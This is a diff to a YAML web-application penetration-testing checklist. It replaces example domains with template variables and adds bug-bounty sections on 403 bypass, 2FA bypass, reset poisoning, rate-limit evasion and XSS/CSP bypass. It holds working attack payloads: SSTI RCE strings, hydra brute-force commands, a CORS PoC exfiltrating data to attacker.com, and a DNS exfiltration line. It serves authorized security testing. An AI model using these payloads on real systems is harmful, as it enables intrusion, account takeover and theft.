@@ -1,5 +1,5 @@
 name: "Web Application Testing"
-version: "2.1.0"
+version: "2.3.0"
 author: "HackMind"
 tier: asset
 description: >
@@ -50,29 +50,29 @@ nodes:
     children:
       - id: recon_scope
         type: checklist
-        title: "Define scope and collect seed assets"
+        title: "Define scope and collect seed assets for {{target_name}}"
         content: |
-          Before anything else, clearly define what is in scope.
+          Before anything else, clearly define what is in scope for {{target_name}}.
           - Read the program policy / rules of engagement
           - List all in-scope domains, subdomains, IPs, and ASNs
           - Note any explicitly out-of-scope assets (third-party, CDNs, etc.)
           - Record the target organisation name and known ASNs:
-            whois <domain> | grep -i "org\|asn"
-            amass intel -org "Target Corp"
+            whois {{target_name}} | grep -i "org\|asn"
+            amass intel -org "{{target_name}}"
 
       - id: recon_subdomain
         type: checklist
         title: "Subdomain Enumeration"
         content: |
           Passive (no direct contact):
-          - crt.sh / cert.sh: https://crt.sh/?q=%25.target.com
-          - subfinder -d target.com -all -recursive
-          - amass enum -passive -d target.com
-          - assetfinder --subs-only target.com
+          - crt.sh / cert.sh: https://crt.sh/?q=%25.{{target_name}}
+          - subfinder -d {{target_name}} -all -recursive
+          - amass enum -passive -d {{target_name}}
+          - assetfinder --subs-only {{target_name}}
           - GitHub, Shodan, VirusTotal, SecurityTrails, Chaos (chaos.projectdiscovery.io)
 
           Active (DNS brute-force):
-          - puredns brute all.txt target.com -r resolvers.txt
+          - puredns brute all.txt {{target_name}} -r resolvers.txt
           - dnsx -l subdomains.txt -a -cname -resp
 
           Post-enumeration:
@@ -82,19 +82,19 @@ nodes:
 
       - id: recon_google_dorks
         type: checklist
-        title: "Google dorking and OSINT"
+        title: "Google dorking and OSINT for {{target_name}}"
         content: |
           Use Google / Bing / DuckDuckGo with operators:
-          - site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx
-          - site:target.com inurl:admin OR inurl:login OR inurl:dashboard
-          - site:target.com "index of /" OR "directory listing"
-          - site:target.com ext:sql OR ext:log OR ext:bak OR ext:env
-          - "target.com" "api_key" OR "secret" OR "password" site:github.com
-          - intitle:"500 Internal Server Error" site:target.com
+          - site:{{target_name}} filetype:pdf OR filetype:xlsx OR filetype:docx
+          - site:{{target_name}} inurl:admin OR inurl:login OR inurl:dashboard
+          - site:{{target_name}} "index of /" OR "directory listing"
+          - site:{{target_name}} ext:sql OR ext:log OR ext:bak OR ext:env
+          - "{{target_name}}" "api_key" OR "secret" OR "password" site:github.com
+          - intitle:"500 Internal Server Error" site:{{target_name}}
 
           Other OSINT:
-          - Shodan: hostname:target.com / org:"Target Corp"
-          - Censys: parsed.names: target.com
+          - Shodan: hostname:{{target_name}} / org:"{{target_name}}"
+          - Censys: parsed.names: {{target_name}}
           - FOFA / ZoomEye / Netlas for additional asset discovery
           - https://leakix.net - data breach search
 
@@ -106,11 +106,11 @@ nodes:
           Tools: trufflehog, gitleaks, gitrob, gh-dork
 
           Manual searches:
-          - github.com/search?q="target.com"+password
-          - github.com/search?q="target.com"+api_key
-          - github.com/search?q="target.com"+secret
-          - github.com/search?q=target.com+filename:.env
-          - github.com/search?q=target.com+filename:config.yml
+          - github.com/search?q="{{target_name}}"+password
+          - github.com/search?q="{{target_name}}"+api_key
+          - github.com/search?q="{{target_name}}"+secret
+          - github.com/search?q={{target_name}}+filename:.env
+          - github.com/search?q={{target_name}}+filename:config.yml
 
           If source repo found:
           - trufflehog git <repo_url> --only-verified
@@ -123,8 +123,8 @@ nodes:
         title: "Historical URL and parameter analysis"
         content: |
           Mine archived versions for old endpoints, parameters, and JS:
-          - waybackurls target.com | tee wayback.txt
-          - gau target.com --mc 200 | tee gau.txt
+          - waybackurls {{target_name}} | tee wayback.txt
+          - gau {{target_name}} --mc 200 | tee gau.txt
           - cat wayback.txt gau.txt | unfurl paths | sort -u
 
           Look for:
@@ -133,16 +133,16 @@ nodes:
           - Old API versions (v1, v2) still alive
           - Previously exposed files (backups, configs)
 
-          katana -u https://target.com -depth 5 -jc -kf all -d 5 -o katana.txt
+          katana -u {{target_url}} -depth 5 -jc -kf all -d 5 -o katana.txt
 
       - id: recon_tech_fingerprint
         type: checklist
         title: "Technology Fingerprinting"
         content: |
           Identify the full tech stack:
-          - whatweb -a 3 https://target.com
+          - whatweb -a 3 {{target_url}}
           - Wappalyzer browser extension
-          - httpx -u https://target.com -tech-detect -title -status-code
+          - httpx -u {{target_url}} -tech-detect -title -status-code
 
           HTTP headers to inspect:
           - Server: nginx/1.18 -> version disclosure
@@ -152,8 +152,8 @@ nodes:
           - Set-Cookie name patterns: PHPSESSID, JSESSIONID, ASP.NET_SessionId
 
           Identify WAF:
-          - wafw00f https://target.com
-          - nmap --script http-waf-detect -p 443 target.com
+          - wafw00f https://{{target_name}}
+          - nmap --script http-waf-detect -p 443 {{target_name}}
           - Look for Cloudflare (CF-RAY), Akamai, Imperva, AWS WAF response patterns
 
           Use the answers here to drive the WSTG-CONF web-server / backend / CMS
@@ -164,8 +164,8 @@ nodes:
         title: "Content & directory discovery"
         content: |
           Enumerate paths, files, and hidden endpoints:
-          - ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,201,204,301,302,403 -o ffuf.json
-          - feroxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/common.txt --depth 3 --auto-tune
+          - ffuf -u {{target_url}}/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,201,204,301,302,403 -o ffuf.json
+          - feroxbuster -u {{target_url}} -w /opt/SecLists/Discovery/Web-Content/common.txt --depth 3 --auto-tune
 
           High-value targets:
           - /.git/HEAD, /.git/config, /.svn/entries
@@ -179,7 +179,7 @@ nodes:
           - /api, /api/v1, /api/v2, /swagger-ui, /openapi.json, /graphql
 
           File extension bruteforce on discovered paths:
-          ffuf -u https://target.com/indexFUZZ -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt
+          ffuf -u https://{{target_name}}/indexFUZZ -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt
 
       - id: recon_js_analysis
         type: checklist
@@ -191,7 +191,7 @@ nodes:
             grep -oP '(https?://[^\s"'"'"']+|/api/[^\s"'"'"']+)' bundle.js
 
           Tools:
-          - LinkFinder: python3 linkfinder.py -i https://target.com -d
+          - LinkFinder: python3 linkfinder.py -i https://{{target_name}} -d
           - SecretFinder: python3 SecretFinder.py -i app.min.js -o cli
           - trufflehog filesystem --directory ./js_files
 
@@ -241,7 +241,7 @@ nodes:
         title: "Enumerate response headers (WSTG-CONF-07)"
         content: |
           Read and document all response headers — always useful for understanding the app's defence posture:
-          curl -s -D - https://target.com -o /dev/null
+          curl -s -D - https://{{target_name}} -o /dev/null
           Or use securityheaders.com / Mozilla Observatory for a quick visual summary.
 
           Record which of these are present and note their exact values:
@@ -288,8 +288,8 @@ nodes:
           - Jenkins: admin/admin at /jenkins or /
           - Grafana: admin/admin
           - Kibana / Elasticsearch: no auth by default (older versions)
-          - Redis: no auth by default — try redis-cli -h target.com PING
-          - MongoDB: no auth by default — try mongosh target.com
+          - Redis: no auth by default — try redis-cli -h {{target_name}} PING
+          - MongoDB: no auth by default — try mongosh {{target_name}}
           - phpMyAdmin: root/(blank)
           - Tomcat Manager: tomcat/tomcat, admin/admin at /manager/html
           - JBoss: admin/(blank) at /jmx-console
@@ -304,19 +304,19 @@ nodes:
           - OPTIONS -> check Allow header for PUT, DELETE, TRACE, CONNECT
           - TRACE -> enable XST (Cross-Site Tracing): sends back HttpOnly cookies?
           - PUT -> WebDAV file upload
-          curl -X OPTIONS https://target.com -v
+          curl -X OPTIONS https://{{target_name}} -v
 
           Directory listing:
           - Check if any path returns a directory index (Apache autoindex, nginx autoindex on)
           - Look for /uploads/, /backup/, /files/, /assets/, /static/
-          - gobuster dir -u https://target.com -w dirs.txt --discover-backup
+          - gobuster dir -u https://{{target_name}} -w dirs.txt --discover-backup
 
       - id: misconfig_sensitive_files
         type: checklist
         title: "Exposed sensitive files and paths (WSTG-CONF-04 / 05)"
         content: |
           High-value sensitive paths:
-          - /.git/ -> source code disclosure: wget -r https://target.com/.git/
+          - /.git/ -> source code disclosure: wget -r https://{{target_name}}/.git/
           - /.svn/, /.hg/, /.bzr/ -> VCS metadata
           - /.env, /.env.local, /.env.production -> credentials
           - /wp-config.php, /config.php, /database.yml, /settings.py
@@ -400,7 +400,7 @@ nodes:
                   - try_files directive bypassing access controls
 
                   Check: nginx -T for config (if you have access in pentest)
-                  Nuclei: nuclei -t nginx/ -u https://target.com
+                  Nuclei: nuclei -t nginx/ -u https://{{target_name}}
           - label: "Apache"
             key: "apache"
             children:
@@ -410,7 +410,7 @@ nodes:
                 content: |
                   - mod_status at /server-status — internal server stats
                   - mod_info at /server-info — module configuration
-                  - Trace enabled: curl -X TRACE https://target.com (XST)
+                  - Trace enabled: curl -X TRACE https://{{target_name}} (XST)
                   - .htaccess exposure: GET /.htaccess — should 403 / 404
                   - Directory listing: Options +Indexes in .htaccess
                   - ETags leaking inode numbers (historical, less relevant now)
@@ -776,7 +776,7 @@ nodes:
                 content: |
                   - Origin IP disclosure (to bypass WAF/DDoS): historical DNS (SecurityTrails, crt.sh),
                     SSRF, email headers, /cdn-cgi/trace, subdomains pointing direct-to-origin
-                  - Once origin IP found: connect directly with Host: target.com to bypass the WAF
+                  - Once origin IP found: connect directly with Host: {{target_name}} to bypass the WAF
                   - Cloudflare Access: is EVERY origin route actually behind Access, or can you reach
                     the origin directly? Check CF-Access-Jwt-Assertion validation on the origin
                   - Workers: SSRF/subrequest abuse, secrets baked into the Worker, open KV/R2 bindings
@@ -838,7 +838,7 @@ nodes:
                 title: "WordPress security checks"
                 content: |
                   Automated scan:
-                  - wpscan --url https://target.com --enumerate ap,at,u --api-token <token>
+                  - wpscan --url https://{{target_name}} --enumerate ap,at,u --api-token <token>
 
                   Manual checks:
                   - /wp-login.php: accessible? Password brute-force (lock-out policy?)
@@ -864,7 +864,7 @@ nodes:
                   - /admin/: accessible without auth?
                   - Drupalgeddon 2 (CVE-2018-7600): RCE — check if version < 7.58 or < 8.5.1
                   - Drupalgeddon 3 (CVE-2018-7602): check same versions
-                  - droopescan scan drupal -u https://target.com
+                  - droopescan scan drupal -u https://{{target_name}}
                   - /node/1, /node/2: enumerate content nodes
                   - REST API: /jsonapi/ or /rest/ — check for unauthenticated data access
           - label: "Joomla"
@@ -880,7 +880,7 @@ nodes:
                     /api/index.php/v1/config/application?public=true
                   - Component SQLi/LFI: enumerate ?option=com_* (com_fields, com_users, com_content)
                   - configuration.php exposure; /tmp and /logs paths
-                  - Tools: joomscan, droopescan scan joomla -u https://target.com
+                  - Tools: joomscan, droopescan scan joomla -u https://{{target_name}}
           - label: "Magento / Adobe Commerce"
             key: "magento"
             children:
@@ -911,7 +911,7 @@ nodes:
                   - /crx/explorer/, /etc.json, /home/users.json, default login /libs/granite/core/.../login.html
                   - GraphQL: /content/_cq_graphql, /graphql/execute.json
                   - SSRF: /libs/cq/contentsync, /bin/wcm, reporting proxies
-                  - Tools: aem-hacker (aem_hacker.py -u https://target.com), nuclei -t aem/
+                  - Tools: aem-hacker (aem_hacker.py -u https://{{target_name}}), nuclei -t aem/
           - label: "Sitecore"
             key: "sitecore"
             children:
@@ -1013,10 +1013,10 @@ nodes:
                 title: "Account takeover via identifier confusion (WSTG-IDNT-04)"
                 content: |
                   Register variants of a victim's identifier and see if the app conflates them:
-                  - Sub-addressing: victim+tag@target.com
-                  - Dots / casing: VICTIM@target.com, vic.tim@gmail.com
-                  - Unicode / homoglyph normalisation: victím@target.com
-                  - Trailing whitespace or null byte: "victim@target.com "
+                  - Sub-addressing: victim+tag@{{target_name}}
+                  - Dots / casing: VICTIM@{{target_name}}, vic.tim@gmail.com
+                  - Unicode / homoglyph normalisation: victím@{{target_name}}
+                  - Trailing whitespace or null byte: "victim@{{target_name}} "
                   - Overlong UTF-8 / punycode in the domain part
                   If a variant lands in the victim's account or a shared tenant -> ATO.
           - label: "No"
@@ -1059,7 +1059,7 @@ nodes:
                           Common defaults: admin:admin, admin:password, admin:123456, root:root
                           test:test, guest:guest, admin:(blank), administrator:administrator
                           Check vendor documentation for product-specific defaults.
-                          Hydra: hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+                          Hydra: hydra -L users.txt -P passwords.txt {{target_name}} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
                   - label: "JWT"
                     key: "jwt"
                     children:
@@ -1146,7 +1146,7 @@ nodes:
                           Manipulate redirect_uri in the authorization request:
                           - Add a path: https://legit.com/callback/../../../attacker.com
                           - Add a parameter: https://legit.com/callback?next=https://attacker.com
-                          - Use a different subdomain: https://sub.target.com/callback (if registered at domain level)
+                          - Use a different subdomain: https://sub.{{target_name}}/callback (if registered at domain level)
                           - Try open redirect chaining from the registered redirect_uri
                           - Test regex bypass: https://legit.com.attacker.com/callback
                       - id: auth_oauth_token_leak
@@ -1298,7 +1298,7 @@ nodes:
                         content: |
                           - Basic credentials are base64 (not encryption) — confirm TLS is enforced
                           - Brute-force / credential stuffing (Basic often has no lockout):
-                            hydra -L users -P pass target.com http-get /protected
+                            hydra -L users -P pass {{target_name}} http-get /protected
                           - Default creds on the protected resource (admin panels, /server-status)
                           - Is Basic auth applied consistently, or can some methods/paths skip it?
                             (e.g. only GET protected; proxy strips the realm on certain routes)
@@ -1354,7 +1354,7 @@ nodes:
                       - Is the old password invalidated immediately on reset?
                       - Host header injection: send reset with Host: attacker.com
                         -> does the email link point to attacker.com?
-                      - Test parameter pollution: email=victim@target.com&email=attacker@evil.com
+                      - Test parameter pollution: email=victim@{{target_name}}&email=attacker@evil.com
                       - Test if token is predictable (timestamp-based, sequential)
                       - Can you reset someone else's account by manipulating the reset request?
 
@@ -1460,7 +1460,7 @@ nodes:
           - HttpOnly — not accessible via JavaScript
           - SameSite=Strict or Lax — CSRF protection
           Check in browser DevTools -> Application -> Cookies
-          or: curl -s -I https://target.com/login | grep -i set-cookie
+          or: curl -s -I https://{{target_name}}/login | grep -i set-cookie
 
       - id: auth_session_fixation
         type: checklist
@@ -1580,7 +1580,7 @@ nodes:
 
                   Automation:
                   - sqlmap -r request.txt --level=3 --risk=2 --dbs
-                  - sqlmap -u "https://target.com/page?id=1" --batch --crawl=2
+                  - sqlmap -u "https://{{target_name}}/page?id=1" --batch --crawl=2
 
                   NoSQL injection (MongoDB):
                   - {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -1721,7 +1721,7 @@ nodes:
                   Exploitation (RCE):
                   Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
                   FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-                  Tool: tplmap -u "https://target.com/page?name=*" --os-shell
+                  Tool: tplmap -u "https://{{target_name}}/page?name=*" --os-shell
 
               - id: q_template_engine
                 type: question
@@ -1917,7 +1917,7 @@ nodes:
                   - Out-of-band: ; nslookup `whoami`.attacker.com
                   - Burp Collaborator payloads for DNS exfiltration
 
-                  Tool: commix --url="https://target.com/page?ip=INJECT_HERE"
+                  Tool: commix --url="https://{{target_name}}/page?ip=INJECT_HERE"
           - label: "No"
             key: "no"
             children: []
@@ -2259,8 +2259,8 @@ nodes:
         type: checklist
         title: "TLS / SSL configuration (WSTG-CRYP-01)"
         content: |
-          testssl.sh https://target.com
-          sslyze --regular target.com
+          testssl.sh https://{{target_name}}
+          sslyze --regular {{target_name}}
           Qualys SSL Labs: https://www.ssllabs.com/ssltest/
 
           Check for:
@@ -2428,11 +2428,11 @@ nodes:
           - If ACAO: null + credentials allowed -> exploit via sandboxed iframe
 
           Subdomain trust:
-          - Try: Origin: https://sub.target.com or Origin: https://attacker.target.com.evil.com
-          - Regex bypass: Origin: https://attacker.comtarget.com
+          - Try: Origin: https://sub.{{target_name}} or Origin: https://attacker.{{target_name}}.evil.com
+          - Regex bypass: Origin: https://attacker.com{{target_name}}
 
           PoC skeleton:
-          fetch("https://target.com/api/me", {credentials: "include"})
+          fetch("https://{{target_name}}/api/me", {credentials: "include"})
             .then(r => r.text()).then(d => location="https://attacker.com/?d="+btoa(d))
 
       - id: headers_clickjacking
@@ -2441,7 +2441,7 @@ nodes:
         scope_tags: [clickjacking]
         content: |
           Check if the page can be embedded in an iframe:
-          <iframe src="https://target.com/account/change-email" width=600 height=600></iframe>
+          <iframe src="https://{{target_name}}/account/change-email" width=600 height=600></iframe>
           If it loads without X-Frame-Options or CSP frame-ancestors -> potentially vulnerable.
 
           High-impact targets for clickjacking:
@@ -2660,6 +2660,54 @@ nodes:
             key: "no"
             children: []
 
+  - id: adv_web_matrix
+    type: info
+    title: "Advanced Exploitation Matrix"
+    content: "Focused checks for web cache deception, HTTP request smuggling, race conditions, and DOM-based XSS."
+    children:
+      - id: web_cache_deception
+        type: checklist
+        title: "Web Cache Deception / Poisoning"
+        scope_tags: [high, cache, logic]
+        content: |
+          1. Log in to {{target_url}}.
+          2. Visit `GET /profile/nonexistent.css`
+          3. Check if sensitive data is cached and accessible unauthenticated.
+          4. For poisoning, test unkeyed headers and `X-Original-URL` variations.
+
+      - id: http_request_smuggling
+        type: checklist
+        title: "HTTP Request Smuggling (CL.TE / TE.CL)"
+        scope_tags: [critical, smuggling, advanced]
+        content: |
+          Test for discrepancies in header parsing between front-end and back-end:
+          - CL.TE: two Content-Length headers with conflicting values
+          - TE.CL: Transfer-Encoding: chunked with a smuggled prefix
+          - Use Burp HTTP Request Smuggler or `smuggler.py` to detect the class.
+          - Confirm impact: steal other users' requests or poison the cache.
+
+      - id: race_conditions_adv
+        type: checklist
+        title: "Race Conditions (Single-Packet Attack)"
+        scope_tags: [high, logic]
+        content: |
+          ### Single-packet Attack (HTTP/2)
+          Send multiple requests in a single TCP packet to bypass window-based
+          protections.
+          **Target Flows:** Funds transfer, coupon redemption, 2FA submission.
+
+      - id: dom_xss_sinks
+        type: checklist
+        title: "Audit DOM XSS Sources and Sinks"
+        scope_tags: [high, xss, client-side]
+        content: |
+          ### DOM-Based XSS
+          **Common Sinks:** `innerHTML`, `document.write()`, `eval()`,
+          `jQuery.html()`, `location.assign()`.
+          **Sources:** `location.hash`, `location.search`, `window.name`,
+          `postMessage` data, `document.referrer`.
+          - Trace each source to a sink with the browser DevTools or DOM Invader.
+
   # =========================================================================
   # COMMON BUG BOUNTY FINDINGS (cross-cutting, high-signal)
   # =========================================================================
@@ -2673,7 +2721,7 @@ nodes:
         title: "Subdomain takeover"
         content: |
           From subdomain enumeration, check each CNAME:
-          dig CNAME sub.target.com
+          dig CNAME sub.{{target_name}}
 
           If CNAME points to a third-party service that can be claimed:
           - GitHub Pages: *.github.io
@@ -2705,7 +2753,7 @@ nodes:
           - \/\/attacker.com
           - https:attacker.com
           - javascript:alert(1)
-          - https://target.com@attacker.com
+          - https://{{target_name}}@attacker.com
           - https://attacker.com/..%2F..%2F
 
           Also look for:
@@ -2809,4 +2857,165 @@ nodes:
           - Host header injection -> password reset poisoning
           - IDOR on account settings (change email/password of another user)
           - Race condition on account creation -> conflate two accounts
+
+      - id: bb_403_bypass
+        type: checklist
+        title: "403 / status code bypass"
+        scope_tags: [bypass]
+        content: |
+          Path tricks (keep the Host, vary the path):
+          - /admin/./ , /admin/../admin , //admin , /./admin , /%2e/admin
+          - /%2f/admin , /admin/ , /admin/* , /admin.txt/ (trailing slash)
+          Protocol swap: https:// blocked -> try http://
+          Header battery (one at a time):
+          - X-Original-URL: /admin   |   X-Rewrite-URL: /admin
+          - X-Forwarded-For: 127.0.0.1   |   X-Custom-IP-Authorization: 127.0.0.1
+          - X-Host: localhost   |   Client-IP: 127.0.0.1
+          Automate: 4-ZERO-3 (github.com/Dheerajmadhukar/4-ZERO-3) or 403bypasser
+
+      - id: bb_origin_ip
+        type: checklist
+        title: "Find the origin IP (behind WAF/CDN)"
+        scope_tags: [recon, waf]
+        content: |
+          - DNS history: securitytrails.com / viewdns.info/iphistory — pre-CDN A records
+          - crt.sh: SANs containing the domain on certs from other hosts (origin often listed)
+          - Shodan: ssl.cert.subject.CN:"{{target_name}}" org:"<cloud provider>"
+          - If direct-IP found: curl -H "Host: {{target_name}}" https://<ip>/ — must serve the app
+          - Check http://<origin-ip> with the Host header for admin panels not exposed via CDN
+          - IP-range scan of the hosting ASN with the Host header set (masscan + httpx)
+
+      - id: bb_otp_2fa_bypass
+        type: checklist
+        title: "OTP / 2FA bypass"
+        scope_tags: [critical, auth, ato]
+        content: |
+          Response manipulation:
+          - Wrong OTP -> flip {"success":false} to {"success":true} or 401 -> 200 in Burp
+          - Status code only: 302 to 2FA page -> force-browse the post-auth page
+          Brute force:
+          - Intruder on the OTP field (000000-999999); watch response length differences
+          Logic:
+          - Cross-account: OTP issued for account A accepted on account B
+          - Null / empty / 000000 / 123456 as OTP values
+          - Swap the phone-number parameter mid-flow -> OTP sent to attacker's number
+          - Password reset flow disables 2FA -> reset then login without OTP
+          - "Remember this device" cookie brute-forced or copied from attacker's own account
+
+      - id: bb_password_reset_poison
+        type: checklist
+        title: "Password reset poisoning"
+        scope_tags: [critical, ato]
+        content: |
+          - Host header: send reset with Host: attacker.com (or X-Forwarded-Host: attacker.com)
+            -> reset link delivered to the victim but points to attacker's host (token in logs)
+          - Response manipulation: flip the error response on the reset-confirm endpoint
+          - Stale tokens: request a reset, change the email, then use the old link
+          - Token in referrer: click the link then browse external page (Referrer leaks token)
+          - Reset link with predictable/sequential token; token not invalidated after use
+          - Payloads in email fields: victim@{{target_name}}@attacker.com, unicode confusables
+
+      - id: bb_signup_tamper
+        type: checklist
+        title: "Sign-up / auth response tampering"
+        scope_tags: [critical, ato]
+        content: |
+          - Intercept the login / verify / signup response: {"code":403} or
+            {"verified":false} -> change to 200 / true and continue the flow
+          - Intercept the OTP-verify step and resend the captured success response
+          - Response contains reset tokens / OTPs / internal IDs on error pages
+          - Duplicate-email signup with different casing -> account conflation
+          - Negative-value / array payloads in role or plan fields at signup:
+            "plan":"enterprise", "credits": 99999, "role":["admin","user"]
+
+      - id: bb_weak_password_policy
+        type: checklist
+        title: "Weak password policy (all three flows)"
+        scope_tags: [medium, auth]
+        content: |
+          Policies are often only enforced at registration. Test password = username/email and
+          classic weak values (123456, qwerty123, abcabc) on:
+          - Registration
+          - Password reset (set the new password)
+          - Change-password (self-service)
+          Chain with missing login rate limiting for full account takeover impact.
+
+      - id: bb_rate_limit_bypass
+        type: checklist
+        title: "Rate limit bypass"
+        scope_tags: [medium, bypass]
+        content: |
+          Same request, rotate these headers with fresh values:
+          - X-Forwarded-For: <random-ip>   |   X-Real-IP: <random-ip>
+          - X-Client-IP: <random-ip>   |   True-Client-IP: <random-ip>
+          Other tricks:
+          - Change HTTP verb (GET<->POST), add random GET params, or change path casing (/API/)
+          - Parameter tampering: repeat the limited param (code=x&code=y) or wrap in arrays
+          - Session rotation: new cookie per request when the limit is per-session
+          - Endpoint variants: /api/v1/login vs /api/v1/Login vs trailing slash
+
+      - id: bb_app_dos
+        type: checklist
+        title: "Application-level DoS (logic-based)"
+        scope_tags: [dos, logic]
+        content: |
+          - Long password DoS: 100k-char password on forgot/change-password (bcrypt hashing
+            exhausts CPU) — registration usually caps it, reset/change often does not
+          - Long string DoS: 1000+ char values in search / profile fields -> 500 or hang
+          - Permanent lockout: loop valid-email + wrong password 10-20x if lockout is
+            long and there is no captcha
+          - Costly operations without throttle: PDF export, mass email, complex search
+
+      - id: bb_xss_bypass
+        type: checklist
+        title: "XSS filter & CSP bypass payloads"
+        scope_tags: [high, xss]
+        content: |
+          Filter bypasses:
+          - Backticks for parens: <img src=x onerror=alert`1`>
+          - Newline break: <script>%0aalert(1)</script>
+          - Nested tags: <scr<script>ipt>alert(1)</scr</script>ipt>
+          - Unusual whitespace: <svg/onload=alert(1)>  <svg•onload=alert(1)>
+          - Polyglot: javascript:/*--></title></style></textarea></script>
+            </xmp><svg/onload='+/"/+/onmouseover=1/+alert(1)//'>
+          CSP bypass:
+          - JSONP endpoint in script-src allowlist: ?vuln=https://accounts.google.com/o/
+            oauth2/revoke?callback=alert(1337)
+          - data:/base64 allowed -> <iframe src="data:text/html,<svg onload=alert(1)>">
+          - Reflected CSP header (inject your own script-src)
+          Pipeline: waybackurls {{target_name}} | gf xss | dalfox pipe -b <blind-xss-callback>
+
+      - id: bb_blind_xss
+        type: checklist
+        title: "Blind XSS deployment points"
+        scope_tags: [critical, xss]
+        content: |
+          Plant an XSS-Hunter / bxss callback payload everywhere an admin will eventually see it:
+          - Contact / support forms, feedback widgets, live chat
+          - User-Agent header, Referer header
+          - Profile fields visible to moderators/admins
+          - Order notes, invoice addresses (e-commerce admin panels)
+          - Log viewers: send deliberate 404s/500s with the payload in the URL
+
+      - id: bb_tabnabbing
+        type: checklist
+        title: "Tabnabbing (reverse tabnab)"
+        scope_tags: [low, client-side]
+        content: |
+          - Find <a href="..." target="_blank"> without rel="noopener noreferrer"
+            (forums, comments, profiles — anywhere users can set a link)
+          - Attacker page runs window.opener.location = "https://evil-phish" -> the original
+            tab silently swaps to a phishing login
+          - Fix is rel="noopener noreferrer"; report when a user-controlled URL is involved
+
+      - id: bb_broken_link_hijack
+        type: checklist
+        title: "Broken link hijacking"
+        scope_tags: [medium, recon]
+        content: |
+          - npx broken-link-checker -rof --filter-level 3 https://{{target_name}}/
+          - Focus on external links to social profiles / docs / CDNs that are dead
+          - Claim the dead handle (LinkedIn company page, Twitter, YouTube) or register the
+            expired domain and host phishing content under the target's trusted page
+          - Re-check periodically: httpx on old CDN/docs links found in wayback data
 
